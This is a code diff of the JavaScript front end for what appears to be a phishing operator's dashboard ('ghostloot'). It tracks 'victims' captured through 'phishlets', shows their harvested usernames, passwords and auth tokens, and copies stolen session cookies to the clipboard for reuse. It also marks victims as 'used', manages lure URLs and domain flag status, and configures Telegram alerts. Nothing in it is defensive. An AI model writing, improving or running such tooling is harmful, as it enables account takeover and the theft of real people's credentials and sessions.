+      <p class="sub">${kindCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
+      <div class="insp-actions">
+        ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
+          <button class="btn" data-view="${b.id}">${t('view_json')}</button>
+          <button class="btn" data-ck="${b.id}">${t('view_cookies')}</button>` : ''}
+        <button class="btn" data-copyuser="${esc(v.username)}">${t('copy_user')}</button>
       </div>
-      <div class="k" style="margin-bottom:4px">${t('attempts_h')} (${v.sessions.length})</div>
-      <div class="attempts">${v.sessions.sort((a,b)=>b.update-a.update).map(s=>`
+      <div class="meta-grid">
+        <div><div class="k">${t('best_session')}</div><div class="v">#${b ? b.id : '—'} · ${b && b.token ? esc(b.token) : t('kind_none')}</div></div>
+        <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
+        <div><div class="k">${t('useragent')}</div><div class="v">${esc(b && b.useragent)}</div></div>
+        <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
+      </div>
+      <div class="k" style="margin-bottom:4px;color:var(--faint)">${t('attempts_h')} (${v.sessions.length})</div>
+      <div class="attempts">${v.sessions.slice().sort((a, b) => b.update - a.update).map(s => `
         <div class="a">
           <span class="mut">#${s.id}</span>
           <span class="phl">${esc(s.phishlet)}</span>
-          ${s.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}
-          <span class="num">${s.cookies} ${t('cookies_w')}</span>
+          ${kindCell(s)}
+          <span class="num">${s.cookies}</span>
           <span class="mut">${esc(s.remote_addr)}</span>
           <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
-          ${s.password?`<span class="secret hide" onclick="this.classList.toggle('hide')">${esc(s.password)}</span>`:''}
-          <span class="spacer" style="flex:1"></span>
-          ${s.cookies?`<button class="rowbtn primary" data-copy="${s.id}">${t('copy_cookies')}</button> <button class="rowbtn" data-view="${s.id}">JSON</button> <button class="rowbtn" data-ck="${s.id}" data-box="${rid}">${t('view_cookies')}</button>`:''}
+          ${s.password ? `<span class="secret hide" data-reveal>${esc(s.password)}</span>` : ''}
+          ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
         </div>`).join('')}</div>
-      <div class="cookies-list" id="ck_${rid}" hidden></div>
+      <div class="cookies-list" id="ckbox" hidden></div>
       <div class="vstate">
-        <label class="setchk"><input type="checkbox" data-used="${esc(v.username)}" ${vst.used?'checked':''}> ${t('mark_used')}</label>
-        <input class="notes" data-notesuser="${esc(v.username)}" placeholder="${t('notes_ph')}" value="${esc(vst.notes||'')}">
-        <button class="rowbtn" data-savevs="${esc(v.username)}">${t('save')}</button>
-        ${multiIp?`<span class="mut" style="font-size:11px">IPs: ${[...ips].join(', ')}</span>`:''}
-      </div>
-    </div></td></tr>`;
-  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_victims')}</td></tr>`;
-  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
-  bindRows();
+        <label class="setchk"><input type="checkbox" id="vs_used" ${vst.used ? 'checked' : ''}> ${t('mark_used')}</label>
+        <input class="notes" id="vs_notes" placeholder="${t('notes_ph')}" value="${esc(vst.notes || '')}">
+        <button class="btn" id="vs_save">${t('save')}</button>
+        ${ips.length > 1 ? `<span class="mut">IPs: ${ips.map(esc).join(', ')}</span>` : ''}
+      </div>`;
+    const save = $('#vs_save');
+    if (save) save.onclick = async () => {
+      const used = $('#vs_used').checked;
+      const notes = $('#vs_notes').value;
+      await fetch('/api/vstate', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ user: v.username, used: used ? 'true' : 'false', notes }) });
+      await loadVState(); toast(t('vstate_saved')); render();
+    };
+    return;
+  }
+  const s = row.data;
+  box.innerHTML = `
+    <h2>${esc(s.username) || '#' + s.id}</h2>
+    <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
+    <div class="insp-actions">
+      ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>
+        <button class="btn" data-view="${s.id}">${t('view_json')}</button>
+        <button class="btn" data-ck="${s.id}">${t('view_cookies')}</button>` : ''}
+      ${s.username ? `<button class="btn" data-copyuser="${esc(s.username)}">${t('copy_user')}</button>` : ''}
+    </div>
+    <div class="meta-grid">
+      <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
+      <div><div class="k">${t('password')}</div><div class="v">${s.password ? `<span class="secret hide" data-reveal>${esc(s.password)}</span>` : '—'}</div></div>
+      <div><div class="k">${t('useragent')}</div><div class="v">${esc(s.useragent)}</div></div>
+      <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
+    </div>
+    <div class="cookies-list" id="ckbox" hidden></div>`;
 }
 
-function renderSessions(){
-  let all=state.raw.slice();
-  if(!state.showNoise) all=all.filter(s=>(s.username||'').trim());
-  const filtered=applyFilter(all, s=>s.username, s=>s.phishlet);
-  const getters={ id:s=>s.id, phishlet:s=>s.phishlet, user:s=>s.username||'', valid:s=>s.valid?1:0, cookies:s=>s.cookies, update:s=>s.update };
-  const rows=sortList(filtered,getters);
-  $('#kpis').innerHTML=kpiHTML([
-    {n:state.raw.length,l:t('kpi_total'),c:'b'},
-    {n:state.raw.filter(s=>s.valid).length,l:t('kpi_valid'),c:'g'},
-    {n:state.raw.filter(s=>s.password).length,l:t('kpi_creds'),c:'p'},
-    {n:noiseCount(),l:t('kpi_nologin'),c:'w'},
-    {n:new Set(state.raw.map(s=>s.phishlet)).size,l:t('kpi_phishlets')},
-  ]);
-  $('#thead').innerHTML=th([
-    ['id','#',true],['phishlet',t('th_phishlet'),true],['user',t('th_user'),true],['',t('th_pass'),false],
-    ['valid',t('th_session'),true],['cookies',t('th_cookies'),true],['',t('th_ip'),false],['update',t('th_captured'),true],['',t('th_loot'),false]
-  ]);
-  $('#tbody').innerHTML = rows.length ? rows.map(s=>`
-    <tr class="${state.knownIds.size && !state.knownIds.has(s.id)?'new':''}">
-      <td class="num">${s.id}</td>
-      <td><span class="phl">${esc(s.phishlet)}</span></td>
-      <td>${esc(s.username)||'<span class="mut">-</span>'}</td>
-      <td>${s.password?`<span class="secret hide" onclick="this.classList.toggle('hide')">${esc(s.password)}</span>`:'<span class="mut">-</span>'}</td>
-      <td>${s.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}</td>
-      <td class="num">${s.cookies}</td>
-      <td class="mut">${esc(s.remote_addr)}</td>
-      <td title="${absTime(s.update)}">${relTime(s.update)}</td>
-      <td>${s.cookies?loot(s.id):'<span class="mut">-</span>'}</td>
-    </tr>`).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
-  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
-  bindRows();
+async function copyCookies(id) {
+  try {
+    const r = await fetch('/cookies?id=' + id);
+    const arr = await r.json();
+    await navigator.clipboard.writeText(JSON.stringify(arr, null, 2));
+    toast(t('copied_paste')(id));
+  } catch (e) { toast(t('error') + ': ' + e); }
+}
+async function showCookies(id) {
+  const box = $('#ckbox'); if (!box) return;
+  if (!box.hidden && box.dataset.id === String(id)) { box.hidden = true; return; }
+  box.hidden = false; box.dataset.id = String(id); box.textContent = t('loading');
+  try {
+    const arr = await (await fetch('/cookies?id=' + id)).json();
+    const strong = new Set((currentSel() && (currentSel().data.best || currentSel().data).tokens) || []);
+    box.innerHTML = arr.map(c => `<div><span class="${strong.has(c.name) ? 'strong' : ''}">${esc(c.name)}</span> @${esc(c.domain)}</div>`).join('');
+  } catch (e) { box.textContent = t('error') + ': ' + e; }
 }
 
-function th(cols){
-  return '<tr>'+cols.map(([k,label,sortable])=>{
-    const sorted=sortable&&state.sort.key===k; const ar=sorted?(state.sort.dir<0?'▼':'▲'):'';
-    return `<th class="${sorted?'sorted':''}" ${sortable?`data-sort="${k}"`:''}>${label} <span class="ar">${ar}</span></th>`;
-  }).join('')+'</tr>';
-}
-function loot(id){ return `<button class="rowbtn primary" data-copy="${id}">${t('copy_cookies')}</button> <button class="rowbtn" data-view="${id}">JSON</button>`; }
-
-function bindRows(){
-  document.querySelectorAll('[data-sort]').forEach(el=>el.onclick=()=>{ const k=el.dataset.sort; if(state.sort.key===k) state.sort.dir*=-1; else state.sort={key:k,dir:-1}; render(); });
-  document.querySelectorAll('[data-exp]').forEach(el=>el.onclick=()=>{ const row=$('#'+el.dataset.exp); if(row){ row.hidden=!row.hidden; el.classList.toggle('open',!row.hidden); } });
-  document.querySelectorAll('[data-copy]').forEach(el=>el.onclick=()=>copyCookies(el.dataset.copy));
-  document.querySelectorAll('[data-view]').forEach(el=>el.onclick=()=>window.open('/cookies?id='+el.dataset.view,'_blank'));
-  document.querySelectorAll('[data-ck]').forEach(el=>el.onclick=()=>showCookies(el.dataset.ck, el.dataset.box));
-  document.querySelectorAll('[data-savevs]').forEach(el=>el.onclick=async()=>{
-    const u=el.dataset.savevs;
-    const used=document.querySelector('[data-used="'+u.replace(/"/g,'\\"')+'"]').checked;
-    const notes=document.querySelector('[data-notesuser="'+u.replace(/"/g,'\\"')+'"]').value;
-    await fetch('/api/vstate',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({user:u,used:used?'true':'false',notes})});
-    await loadVState(); toast(t('vstate_saved')); render();
-  });
-}
-
-async function copyCookies(id){
-  try{ const r=await fetch('/cookies?id='+id); const txt=(await r.text()).trim(); await navigator.clipboard.writeText(txt); toast(t('copied_paste')(id)); }
-  catch(e){ toast(t('error')+': '+e); }
-}
-async function showCookies(id, boxRid){
-  const box=$('#ck_'+boxRid); if(!box) return;
-  if(!box.hidden){ box.hidden=true; return; }
-  box.hidden=false; box.textContent=t('loading');
-  try{ const arr=await (await fetch('/cookies?id='+id)).json();
-    box.innerHTML=arr.map(c=>`<div><span class="cn">${esc(c.name)}</span> <span class="cd">@${esc(c.domain)}</span> · ${esc(c.value).slice(0,28)}${c.value.length>28?'…':''}</div>`).join('');
-  }catch(e){ box.textContent=t('error')+': '+e; }
-}
-
-// ---- Settings ----
-let setInit=false;
-function renderSettings(){
-  const v=$('#settingsview');
-  if(!setInit){
+let setInit = false;
+function renderSettings() {
+  const v = $('#settingsview');
+  if (!setInit) {
     v.innerHTML =
       `<h3>${t('set_title')}</h3><p class="sub">${t('set_sub')}</p>
-       <div class="card">
-         <label class="setchk"><input type="checkbox" id="s_en"> ${t('set_enable')}</label>
-         <div class="frow"><label>${t('bot_token')}</label><input type="text" id="s_tok" placeholder="123456:ABC-DEF..." autocomplete="off"></div>
-         <div class="frow"><label>${t('chat_id')}</label><input type="text" id="s_chat" placeholder="12345678" autocomplete="off"></div>
-         <label class="setchk"><input type="checkbox" id="s_min"> ${t('minimal')}</label>
-         <div class="setbtns"><button class="btn on" id="s_save">${t('save_btn')}</button><button class="btn" id="s_test">${t('send_test')}</button></div>
-       </div>
+       <label class="setchk"><input type="checkbox" id="s_en"> ${t('set_enable')}</label>
+       <div class="frow"><label>${t('bot_token')}</label><input type="text" id="s_tok" placeholder="123456:ABC-DEF..." autocomplete="off"></div>
+       <div class="frow"><label>${t('chat_id')}</label><input type="text" id="s_chat" placeholder="12345678" autocomplete="off"></div>
+       <label class="setchk"><input type="checkbox" id="s_min"> ${t('minimal')}</label>
+       <div class="setbtns"><button class="btn primary" id="s_save">${t('save_btn')}</button><button class="btn" id="s_test">${t('send_test')}</button></div>
        <p class="note">${t('set_note')}</p>`;
-    $('#s_save').onclick=saveSettings; $('#s_test').onclick=testTelegram; setInit=true;
+    $('#s_save').onclick = saveSettings; $('#s_test').onclick = testTelegram; setInit = true;
   }
   loadSettingsForm();
 }
-async function loadSettingsForm(){
-  try{ const s=await (await fetch('/api/settings')).json();
-    $('#s_en').checked=!!s.tg_enabled; $('#s_chat').value=s.tg_chat||''; $('#s_min').checked=!!s.minimal_alerts;
-    $('#s_tok').value=''; $('#s_tok').placeholder=s.tg_token_set?t('token_saved'):'123456:ABC-DEF...';
-  }catch(e){}
+async function loadSettingsForm() {
+  try {
+    const s = await (await fetch('/api/settings')).json();
+    $('#s_en').checked = !!s.tg_enabled; $('#s_chat').value = s.tg_chat || ''; $('#s_min').checked = !!s.minimal_alerts;
+    $('#s_tok').value = ''; $('#s_tok').placeholder = s.tg_token_set ? t('token_saved') : '123456:ABC-DEF...';
+  } catch (e) {}
 }
-async function saveSettings(){
-  const body=new URLSearchParams({ tg_token:$('#s_tok').value.trim(), tg_chat:$('#s_chat').value.trim(), tg_enabled:$('#s_en').checked?'true':'false', minimal_alerts:$('#s_min').checked?'true':'false' });
-  await fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});
+async function saveSettings() {
+  const body = new URLSearchParams({ tg_token: $('#s_tok').value.trim(), tg_chat: $('#s_chat').value.trim(), tg_enabled: $('#s_en').checked ? 'true' : 'false', minimal_alerts: $('#s_min').checked ? 'true' : 'false' });
+  await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
   toast(t('settings_saved')); loadSettingsForm();
 }
-async function testTelegram(){ const r=await fetch('/api/test-telegram',{method:'POST'}); if(r.ok) toast(t('test_sent')); else toast(t('error')+': '+(await r.text())); }
+async function testTelegram() { const r = await fetch('/api/test-telegram', { method: 'POST' }); if (r.ok) toast(t('test_sent')); else toast(t('error') + ': ' + (await r.text())); }
 
-// ---- My URLs ----
-let urlsInit=false;
-function renderUrls(){
-  const v=$('#urlsview');
-  if(!urlsInit){
+let urlsInit = false;
+function renderUrls() {
+  const v = $('#urlsview');
+  if (!urlsInit) {
     v.innerHTML =
       `<div class="urlbar">
          <input id="nu" placeholder="${t('url_ph')}" autocomplete="off">
-         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:180px">
-         <button class="btn on" id="addurl">${t('add')}</button>
+         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:160px;min-width:120px">
+         <button class="btn primary" id="addurl">${t('add')}</button>
          <label class="chk"><input type="checkbox" id="onlyactive" checked> ${t('active_only')}</label>
          <button class="btn" id="copyactive">${t('copy_active')}</button>
          <span class="count" id="urlcount"></span>
        </div><div id="urllist"></div>`;
-    $('#addurl').onclick=addUrl;
-    $('#nu').addEventListener('keydown',e=>{ if(e.key==='Enter') addUrl(); });
-    $('#nl').addEventListener('keydown',e=>{ if(e.key==='Enter') addUrl(); });
-    $('#onlyactive').onchange=refreshUrlList; $('#copyactive').onclick=copyActive; urlsInit=true;
+    $('#addurl').onclick = addUrl;
+    $('#nu').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
+    $('#nl').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
+    $('#onlyactive').onchange = refreshUrlList; $('#copyactive').onclick = copyActive; urlsInit = true;
   }
   refreshUrlList();
 }
-async function refreshUrlList(){
-  let arr=[]; try{ arr=await (await fetch('/api/urls')).json(); }catch(e){}
-  window._urls=arr||[];
-  const only=$('#onlyactive')&&$('#onlyactive').checked;
-  const rows=window._urls.filter(u=>!only||u.ok);
-  const list=$('#urllist'); if(!list) return;
-  list.innerHTML = rows.length ? rows.map(u=>`
+async function refreshUrlList() {
+  let arr = []; try { arr = await (await fetch('/api/urls')).json(); } catch (e) {}
+  window._urls = arr || [];
+  const only = $('#onlyactive') && $('#onlyactive').checked;
+  const rows = window._urls.filter(u => !only || u.ok);
+  const list = $('#urllist'); if (!list) return;
+  list.innerHTML = rows.length ? rows.map(u => `
     <div class="urlrow">
-      <span class="dd ${u.ok?'ok':'down'}"></span>
-      <span class="url" data-copyurl="${esc(u.url)}" title="${t('copy')}">${esc(u.url)}</span>
-      ${u.label?`<span class="lab">${esc(u.label)}</span>`:''}
+      <i class="dd" style="width:7px;height:7px;background:${u.ok ? 'var(--olive)' : 'var(--bad)'};display:inline-block"></i>
+      <span class="url" data-copyurl="${esc(u.url)}">${esc(u.url)}</span>
+      ${u.label ? `<span class="lab">${esc(u.label)}</span>` : ''}
       <span class="sp"></span>
-      <span class="mut" style="font-size:11px">${u.ok?t('active'):t('down')}</span>
-      <button class="rowbtn" data-copyurl="${esc(u.url)}">${t('copy')}</button>
-      <button class="rowbtn" data-delurl="${esc(u.url)}">${t('delete')}</button>
-    </div>`).join('') : `<div class="empty">${only?t('url_empty_active'):t('url_empty')}</div>`;
-  const act=window._urls.filter(u=>u.ok).length;
-  if($('#urlcount')) $('#urlcount').textContent=t('url_saved')(act,window._urls.length);
-  document.querySelectorAll('[data-copyurl]').forEach(el=>el.onclick=async()=>{ try{await navigator.clipboard.writeText(el.dataset.copyurl); toast(t('url_copied'));}catch(e){toast(t('error')+': '+e);} });
-  document.querySelectorAll('[data-delurl]').forEach(el=>el.onclick=async()=>{ if(!confirm(t('confirm_del')))return; await fetch('/api/urls?url='+encodeURIComponent(el.dataset.delurl),{method:'DELETE'}); refreshUrlList(); });
+      <span class="mut">${u.ok ? t('active') : t('down')}</span>
+      <button class="btn" data-copyurl="${esc(u.url)}">${t('copy')}</button>
+      <button class="btn" data-delurl="${esc(u.url)}">${t('delete')}</button>
+    </div>`).join('') : `<div class="empty">${only ? t('url_empty_active') : t('url_empty')}</div>`;
+  const act = window._urls.filter(u => u.ok).length;
+  if ($('#urlcount')) $('#urlcount').textContent = t('url_saved')(act, window._urls.length);
 }
-async function addUrl(){
-  const u=$('#nu').value.trim(); if(!u) return; const l=$('#nl').value.trim();
-  await fetch('/api/urls',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({url:u,label:l})});
-  $('#nu').value=''; $('#nl').value=''; toast(t('url_added')); setTimeout(refreshUrlList,400);
+async function addUrl() {
+  const u = $('#nu').value.trim(); if (!u) return; const l = $('#nl').value.trim();
+  await fetch('/api/urls', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ url: u, label: l }) });
+  $('#nu').value = ''; $('#nl').value = ''; toast(t('url_added')); setTimeout(refreshUrlList, 400);
 }
-async function copyActive(){
-  const act=(window._urls||[]).filter(u=>u.ok).map(u=>u.url);
-  if(!act.length){ toast(t('no_active')); return; }
-  try{ await navigator.clipboard.writeText(act.join('\n')); toast(t('active_copied')(act.length)); }catch(e){ toast(t('error')+': '+e); }
+async function copyActive() {
+  const act = (window._urls || []).filter(u => u.ok).map(u => u.url);
+  if (!act.length) { toast(t('no_active')); return; }
+  try { await navigator.clipboard.writeText(act.join('\n')); toast(t('active_copied')(act.length)); } catch (e) { toast(t('error') + ': ' + e); }
 }
 
-async function loadDomains(){
-  try{
-    const arr=await (await fetch('/api/domains')).json();
-    const el=$('#domains');
-    if(!arr||!arr.length){ el.style.display='none'; return; }
-    el.style.display='flex';
-    el.innerHTML='<span class="lbl">'+t('domains')+'</span>'+arr.map(d=>{
-      const cls=d.flagged?'flag':(d.ok?'ok':'down');
-      const st=d.flagged?t('flagged'):(d.ok?(d.code+' · '+d.latency_ms+'ms'):(d.err||('HTTP '+d.code)));
-      return `<span class="dchip" title="${esc(d.url)} · ${esc(d.checked)}"><span class="dd ${cls}"></span><span class="h">${esc(d.host)}</span><span class="s">${esc(st)}</span></span>`;
+async function loadDomains() {
+  try {
+    const arr = await (await fetch('/api/domains')).json();
+    const el = $('#domains');
+    if (!arr || !arr.length) { el.style.display = 'none'; return; }
+    el.style.display = 'flex';
+    el.innerHTML = '<span>' + t('domains') + '</span>' + arr.map(d => {
+      const cls = d.flagged ? 'flag' : (d.ok ? 'ok' : 'down');
+      const st = d.flagged ? t('flagged') : (d.ok ? (d.code + ' · ' + d.latency_ms + 'ms') : (d.err || ('HTTP ' + d.code)));
+      return `<span class="dchip" title="${esc(d.url)} · ${esc(d.checked)}"><i class="${cls}"></i>${esc(d.host)} <span class="mut">${esc(st)}</span></span>`;
     }).join('');
-  }catch(e){}
+  } catch (e) {}
 }
 
-async function fetchData(force){
-  try{
-    loadDomains(); loadHealth(); await loadVState();
-    if(state.tab==='urls' && urlsInit) refreshUrlList();
-    const d=await (await fetch('/api/data')).json();
-    $('#dbpath').textContent=d.db;
-    $('#updated').textContent=t('updated')+' '+d.now;
-    const sig=d.sessions.length+':'+d.sessions.reduce((m,s)=>Math.max(m,s.update),0)+':'+d.sessions.reduce((a,s)=>a+s.cookies,0);
-    if(!force && sig===state.sig) return;
-    const ids=new Set(d.sessions.map(s=>s.id));
-    if(!state.firstLoad && sig!==state.sig){ const fresh=[...ids].filter(i=>!state.knownIds.has(i)); if(fresh.length) toast(t('new_sessions')(fresh.length)); }
-    state.sig=sig; state.raw=d.sessions;
-    const sel=$('#fphishlet'); const cur=sel.value;
-    const phls=[...new Set(d.sessions.map(s=>s.phishlet))].sort();
-    sel.innerHTML=`<option value="">${t('all_phishlets')}</option>`+phls.map(p=>`<option>${esc(p)}</option>`).join('');
-    sel.value=cur;
-    $('#foottotal').textContent=t('sessions_phishlets')(d.sessions.length,phls.length);
-    $('#footsb').innerHTML=d.sb_enabled?t('sb_on'):t('sb_off');
+async function fetchData(force) {
+  try {
+    loadDomains(); await loadHealth(); await loadVState();
+    if (state.tab === 'urls' && urlsInit) refreshUrlList();
+    const d = await (await fetch('/api/data')).json();
+    $('#footdb').textContent = d.db + ' · ' + d.now;
+    const sig = d.sessions.length + ':' + d.sessions.reduce((m, s) => Math.max(m, s.update || 0), 0) + ':' + d.sessions.reduce((a, s) => a + s.cookies, 0);
+    if (!force && sig === state.sig) { renderFacts(); return; }
+    const ids = new Set(d.sessions.map(s => s.id));
+    if (!state.firstLoad && sig !== state.sig) { const fresh = [...ids].filter(i => !state.knownIds.has(i)); if (fresh.length) toast(t('new_sessions')(fresh.length)); }
+    state.sig = sig; state.raw = d.sessions;
+    const sel = $('#fphishlet'); const cur = sel.value;
+    const phls = [...new Set(d.sessions.map(s => s.phishlet))].sort();
+    sel.innerHTML = `<option value="">${t('all_phishlets')}</option>` + phls.map(p => `<option>${esc(p)}</option>`).join('');
+    sel.value = cur;
+    $('#footsb').textContent = d.sb_enabled ? t('sb_on') : t('sb_off');
     render();
-    if(!state.firstLoad) state.knownIds=ids; else { state.knownIds=ids; state.firstLoad=false; }
-  }catch(e){ toast(t('load_err')+': '+e); }
+    if (!state.firstLoad) state.knownIds = ids; else { state.knownIds = ids; state.firstLoad = false; }
+  } catch (e) { toast(t('load_err') + ': ' + e); }
 }
 
-// ---- controls ----
+function selectKey(type, key) {
+  state.sel = { type, key };
+  render();
+}
+function moveSel(delta) {
+  if (!state.rows.length) return;
+  const idx = state.rows.findIndex(r => state.sel && r.type === state.sel.type && r.key === state.sel.key);
+  const n = Math.max(0, Math.min(state.rows.length - 1, (idx < 0 ? 0 : idx) + delta));
+  const r = state.rows[n];
+  state.sel = { type: r.type, key: r.key };
+  render();
+  const want = r.type + ':' + r.key;
+  const el = [...document.querySelectorAll('tbody tr[data-sel]')].find(n => n.dataset.sel === want);
+  if (el) el.scrollIntoView({ block: 'nearest' });
+}
+function selectedCopyId() {
+  const row = currentSel(); if (!row) return null;
+  if (row.type === 'victim') return row.data.best && row.data.best.cookies ? row.data.best.id : null;
+  return row.data.cookies ? row.data.id : null;
+}
+
+document.addEventListener('click', e => {
+  const sort = e.target.closest('[data-sort]');
+  if (sort) { const k = sort.dataset.sort; if (state.sort.key === k) state.sort.dir *= -1; else state.sort = { key: k, dir: -1 }; render(); return; }
+  const copy = e.target.closest('[data-copy]');
+  if (copy) { copyCookies(copy.dataset.copy); return; }
+  const view = e.target.closest('[data-view]');
+  if (view) { window.open('/cookies?id=' + view.dataset.view, '_blank'); return; }
+  const ck = e.target.closest('[data-ck]');
+  if (ck) { showCookies(ck.dataset.ck); return; }
+  const cu = e.target.closest('[data-copyuser]');
+  if (cu) { navigator.clipboard.writeText(cu.dataset.copyuser).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
+  const curl = e.target.closest('[data-copyurl]');
+  if (curl) { navigator.clipboard.writeText(curl.dataset.copyurl).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
+  const del = e.target.closest('[data-delurl]');
+  if (del) { if (!confirm(t('confirm_del'))) return; fetch('/api/urls?url=' + encodeURIComponent(del.dataset.delurl), { method: 'DELETE' }).then(refreshUrlList); return; }
+  const reveal = e.target.closest('[data-reveal]');
+  if (reveal) { reveal.classList.toggle('hide'); return; }
+  const tab = e.target.closest('[data-tab]');
+  if (tab && tab.closest('.rail')) { state.tab = tab.dataset.tab; state.sel = null; render(); return; }
+  const tr = e.target.closest('tbody tr[data-sel]');
+  if (tr) { const [type, ...rest] = tr.dataset.sel.split(':'); selectKey(type, rest.join(':')); }
+});
+
 let qTimer;
-$('#q').addEventListener('input', e=>{ clearTimeout(qTimer); qTimer=setTimeout(()=>{ state.q=e.target.value.trim(); render(); },180); });
-document.addEventListener('keydown', e=>{ if(e.key==='/' && document.activeElement!==$('#q')){ e.preventDefault(); $('#q').focus(); } });
-document.querySelectorAll('.tab').forEach(tb=>tb.onclick=()=>{ state.tab=tb.dataset.tab; render(); });
-$('#fphishlet').onchange=e=>{ state.phishlet=e.target.value; render(); };
-$('#fvalid').onchange=e=>{ state.onlyValid=e.target.checked; render(); };
-$('#fnoise').onchange=e=>{ state.showNoise=e.target.checked; render(); };
-$('#refresh').onclick=()=>fetchData(true);
-$('#auto').onclick=()=>{ state.auto=!state.auto; $('#auto').classList.toggle('on',state.auto); $('#livewrap').classList.toggle('on',state.auto);
-  if(state.auto){ fetchData(false); state.timer=setInterval(()=>fetchData(false),10000); } else clearInterval(state.timer); };
-$('#langbtn').onclick=()=>{ LANG = LANG==='en'?'es':'en'; try{ localStorage.setItem('ghostloot_lang',LANG); }catch(e){}
-  setInit=false; urlsInit=false; applyStatic(); render(); loadHealth(); loadDomains(); };
+$('#q').addEventListener('input', e => { clearTimeout(qTimer); qTimer = setTimeout(() => { state.q = e.target.value.trim(); render(); }, 160); });
+$('#fphishlet').onchange = e => { state.phishlet = e.target.value; render(); };
+$('#fvalid').onchange = e => { state.onlyValid = e.target.checked; render(); };
+$('#fnoise').onchange = e => { state.showNoise = e.target.checked; render(); };
+$('#refresh').onclick = () => fetchData(true);
+$('#auto').onclick = () => {
+  state.auto = !state.auto; $('#auto').classList.toggle('on', state.auto);
+  if (state.auto) { fetchData(false); state.timer = setInterval(() => fetchData(false), 10000); } else clearInterval(state.timer);
+};
+$('#langbtn').onclick = () => {
+  LANG = LANG === 'en' ? 'es' : 'en';
+  try { localStorage.setItem('ghostloot_lang', LANG); } catch (e) {}
+  setInit = false; urlsInit = false; applyStatic(); render(); loadHealth(); loadDomains();
+};
+$('#help').addEventListener('click', e => { if (e.target.id === 'help') $('#help').hidden = true; });
+
+document.addEventListener('keydown', e => {
+  const typing = /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement && document.activeElement.tagName);
+  if (e.key === '/' && !typing) { e.preventDefault(); $('#q').focus(); return; }
+  if (e.key === 'Escape') { $('#help').hidden = true; if (typing) document.activeElement.blur(); return; }
+  if (e.key === '?' && !typing) { e.preventDefault(); $('#help').hidden = !$('#help').hidden; return; }
+  if (typing) return;
+  if (e.key === 'r') { fetchData(true); return; }
+  if (e.key === 'c') { const id = selectedCopyId(); if (id) copyCookies(id); return; }
+  if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
+  if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
+  if (e.key >= '1' && e.key <= '5') {
+    state.tab = ['victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
+    state.sel = null; render();
+  }
+});
 
 applyStatic();
 fetchData(true);
